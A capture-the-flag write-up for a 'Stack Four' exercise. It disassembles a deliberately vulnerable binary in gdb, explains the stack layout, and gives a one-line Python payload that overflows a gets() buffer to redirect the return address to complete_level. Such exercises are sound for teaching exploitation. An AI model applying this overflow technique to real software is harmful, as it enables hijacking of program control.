<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Stack Four :
In this level we will overwrite the return address of a function.Lets start by disassembling `main` function.
```bash
(gdb)disas main

Dump of assembler code for function main:
   0x000000000040066a <+0>:	push   rbp
   0x000000000040066b <+1>:	mov    rbp,rsp
   0x000000000040066e <+4>:	sub    rsp,0x10
   0x0000000000400672 <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:	mov    edi,0x400750
   0x000000000040067e <+20>:	call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:	mov    eax,0x0
   0x0000000000400688 <+30>:	call   0x400635 <start_level>
   0x000000000040068d <+35>:	mov    eax,0x0
   0x0000000000400692 <+40>:	leave  
   0x0000000000400693 <+41>:	ret    
End of assembler dump.
```
Lets have a look at the disassembly of `start_level` function.
```bash
(gdb)disas start_level

Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:	push   rbp
   0x0000000000400636 <+1>:	mov    rbp,rsp
   0x0000000000400639 <+4>:	sub    rsp,0x50
   0x000000000040063d <+8>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:	mov    rdi,rax
   0x0000000000400644 <+15>:	call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:	mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:	mov    rsi,rax
   0x0000000000400658 <+35>:	mov    edi,0x400733
   0x000000000040065d <+40>:	mov    eax,0x0
   0x0000000000400662 <+45>:	call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:	nop
   0x0000000000400668 <+51>:	leave  
   0x0000000000400669 <+52>:	ret    
End of assembler dump.
```

This function will ask us to input data to a buffer at line `0x0000000000400644` after that it will retrive the return address from the stack at line `0x0000000000400649` and store it in local variable at line `0x0000000000400651` to use it in `printf` function.If we overflow the buffer and overwrite the return address of `main` function to `complete_level` function we'll successed in this level.
<br>

Lets break what happen when we call function `start_level` from `main`.
- `call` instruction will push the address of next instruction to the stack and store the address of the first instruction of `start_level` function to `RPI` register.
- 1st line of `start_level` instruction will push the address of the previous function stack frame stored at `RBP` register to the stack.
- 2nd line will store the stack pointer from `RSP` register to `RBP` so that `RBP` register will store the the current stack frame.
-  3rd line will subtract the stack pointer by 0x50 - 0x50 in hex is equal to 80 in decimal- to make space for local variables.
- Last 2 lines the `leave` instruction will retore the value of `EBP` register to it pervious value -the stack frame of `main` function- and deallocates the space on the stack used by `start_level` function. The `ret` instruction is used to return from a function.It pops the return address off the top of stack and transfers control back to the calling function `main`.
<brt>
The stack layout:
```
80 bytes for local variables and temp values needed by start_level function.
8 bytes for the stack frame of start_level function.
8 bytes for the return addres from start_level to main function.
```

Now we now that after 88 byte from the start of the `buffer` is the return address we need to overwrite.Lets find the address of `complete_level` function.

```bash
(gdb) info functions complete_level

All functions matching regular expression "complete_level":

Non-debugging symbols:
0x000000000040061d  complete_level

```
### Solution

```bash
python -c "print('A'*88 + '\x1d\x06\x40\x00\x00\x00\x00\x00')" | ./stack-four 
```